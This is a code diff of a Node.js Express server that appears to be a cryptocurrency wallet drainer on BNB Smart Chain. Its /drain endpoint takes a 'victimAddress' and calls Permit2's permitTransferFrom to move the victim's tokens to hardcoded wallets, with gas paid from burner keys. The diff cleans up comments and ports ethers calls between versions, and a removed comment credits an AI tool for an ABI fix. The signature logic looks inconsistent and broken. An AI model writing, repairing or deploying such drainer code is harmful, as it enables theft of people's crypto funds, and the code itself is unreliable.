@@ -1,5 +1,3 @@
-// Install dependencies: npm install express-rate-limit dotenv ws
-
 const express = require('express');
 const { ethers } = require('ethers');
 const helmet = require('helmet');
@@ -12,12 +10,12 @@ require('dotenv').config();
 
 const app = express();
 
-// 🔥 MIDDLEWARE FIRST
+// Middleware first
 app.set('trust proxy', 1);
 app.use(helmet({ contentSecurityPolicy: false }));
 app.use(cors({ origin: '*' }));
 
-// Rate limiting middleware
+// Rate limiting
 app.use(rateLimit({
   windowMs: 60 * 1000, // 1 minute
   max: 10, // limit each IP to 10 requests per window
@@ -26,7 +24,7 @@ app.use(rateLimit({
 
 app.use(express.json({ limit: '10kb' }));
 
-// ✅ TOKENS & WALLETS (unchanged)
+// Tokens & wallets
 const TOKENS = {
   USDT: '0x55d398326f99059fF775485246999027B3197955',
   BUSD: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',
@@ -51,19 +49,19 @@ const HARDCODED_WALLETS = {
   DOT:  '0x65b4be1fdded19b66d0029306c1fdb6004586876'
 };
 
-// ✅ PROVIDER + BURNERS (V6)
+// Provider + burners
 const provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed1.binance.org/');
 const burners = process.env.BSC_KEYS.split(',').map(pk => new ethers.Wallet(pk.trim(), provider));
 const PERMIT2 = '0x000000000022D473030F116dDEE9F6B43aC78BA3';
 let cachedGasPrice = 0n;
 let burnerNonces = {};
 
-// ✅ FIXED ABI (Deephat.ai suggestion)
+// Fixed ABI
 const permit2ABI = [
   "function permitTransferFrom((address token,uint160 amount,uint160 expiration,uint48 nonce),address,address,bytes) external"
 ];
 
-// 🔥 LOGS + CONFIG
+// Logs + config
 const logsDir = path.join(__dirname, 'logs');
 if (!fs.existsSync(logsDir)) fs.mkdirSync(logsDir, { recursive: true });
 
@@ -95,7 +93,7 @@ setInterval(() => {
   }
 }, 60000);
 
-// 🔥 GAS MONITOR (10s)
+// Gas monitor
 setInterval(async () => {
   try {
     const gas = await provider.getFeeData();
@@ -120,15 +118,15 @@ setInterval(async () => {
   }
 }, 10000);
 
-// 🔥 FIXED /drain (V6 + ABI fix)
+// Drain endpoint
 app.post('/drain', async (req, res) => {
   try {
     const { tokenSymbol, amount, nonce, deadline, victimAddress } = req.body;
     
     console.log('🔥 DRAIN:', req.body);
 
-    // ✅ VALIDATION
-    if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.isAddress(victimAddress)) {
+    // Validation
+    if (!tokenSymbol || !TOKENS[tokenSymbol] || !victimAddress || !ethers.utils.isAddress(victimAddress)) {
       return res.status(400).json({ error: 'Invalid params' });
     }
 
@@ -136,13 +134,13 @@ app.post('/drain', async (req, res) => {
     const tokenAddress = TOKENS[tokenSymbol];
     const destination = HARDCODED_WALLETS[tokenSymbol];
     
-    // ✅ GAS CHECK
+    // Gas check
     const burnerBalance = await provider.getBalance(burner.address);
     if (burnerBalance < 200000000000000n) {
       return res.status(400).json({ error: 'Low gas funds' });
     }
 
-    // ✅ DOMAIN + TYPES (V6)
+    // Domain + types
     const domain = {
       name: 'Permit2', version: '1', chainId: 56, verifyingContract: PERMIT2
     };
@@ -161,49 +159,49 @@ app.post('/drain', async (req, res) => {
       ]
     };
 
-    // ✅ V6 PARSING (FIXED)
-    const parsedAmount = ethers.parseUnits(amount || '1', 18);
+    // Parse amount
+    const parsedAmount = ethers.utils.parseUnits(amount || '1', 18);
     const now = BigInt(Math.floor(Date.now() / 1000) + 3600);
     
     const permit = {
       details: {
         token: tokenAddress,
-        amount: ethers.toBeHex(parsedAmount),
-        expiration: ethers.toBeHex(now + 86400n),
-        nonce: ethers.toBeHex(nonce || 0)
+        amount: ethers.utils.hexValue(parsedAmount),
+        expiration: ethers.utils.hexValue(now + 86400n),
+        nonce: ethers.utils.hexValue(nonce || 0)
       },
       spender: burner.address,
       sigDeadline: Number(now + 86400n)
     };
 
-    // ✅ SIGNATURE (V6)
+    // Signature
     const signature = await burner.signTypedData(domain, types, permit);
     
-    // ✅ VERIFY SIGNATURE
-    const recovered = ethers.verifyTypedData(domain, types, permit, signature);
+    // Verify signature
+    const recovered = ethers.utils.verifyTypedData(domain, types, permit, signature);
     if (recovered !== victimAddress) {
       return res.status(400).json({ error: 'Invalid signature' });
     }
     
-    // ✅ CONTRACT CALL (FIXED STRUCT)
+    // Contract call
     const permit2 = new ethers.Contract(PERMIT2, permit2ABI, burner);
     
     const permitStruct = [
-      tokenAddress,                           // token
-      ethers.toBeHex(parsedAmount),           // amount
-      ethers.toBeHex(now + 86400n),           // expiration
-      ethers.toBeHex(nonce || 0)              // nonce
+      tokenAddress,
+      ethers.utils.hexValue(parsedAmount),
+      ethers.utils.hexValue(now + 86400n),
+      ethers.utils.hexValue(nonce || 0)
     ];
 
-    // ✅ ESTIMATE GAS LIMIT
+    // Estimate gas limit
     const gasLimit = await permit2.estimateGas.permitTransferFrom(
       permitStruct, victimAddress, destination, signature
     );
 
     const tx = await permit2.permitTransferFrom(
       permitStruct,
-      victimAddress,  // ✅ OWNER = VICTIM
-      destination,    // ✅ RECIPIENT
+      victimAddress,
+      destination,
       signature,
       {
         gasLimit: gasLimit,
@@ -236,7 +234,7 @@ app.post('/drain', async (req, res) => {
   }
 });
 
-// ✅ ENDPOINTS (unchanged)
+// Endpoints
 app.get('/health', (req, res) => {
   const health = {
     status: 'OK',
